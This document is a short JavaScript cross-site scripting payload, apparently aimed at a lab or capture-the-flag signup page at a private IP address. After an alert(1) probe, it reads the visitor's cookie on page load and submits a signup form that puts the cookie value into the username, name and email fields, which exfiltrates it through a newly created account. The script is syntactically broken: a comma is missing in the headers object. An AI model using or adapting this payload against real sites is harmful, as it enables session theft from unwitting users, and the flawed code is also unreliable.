const url = "http://192.168.1.40/signup.php";
alert(1)
document.addEventListener("DOMContentLoaded", () => {
    const cookie = document.cookie.split(";")[0]?.split("=")[1] || "defaultUser"; // Extract a specific cookie value

    const headers = {
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "http://192.168.1.40",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": "http://192.168.1.40/signup.php",
	    "cookie":document.cookie
        "Connection": "keep-alive"
    };

    const data = new URLSearchParams({
		"username": cookie,
        "password": "asdwasdw",
        "confirmPassword": "asdwasdw",
        "site": "Paris",
        "email": `${cookie}@gmail.com`,
        "firstname": cookie,
        "lastname": "Doe",  // Avoid XSS
        "signup": "signup"
    });

    fetch(url, {
        method: "POST",
        headers: headers,
        body: data,
        credentials: "include"
    });
});

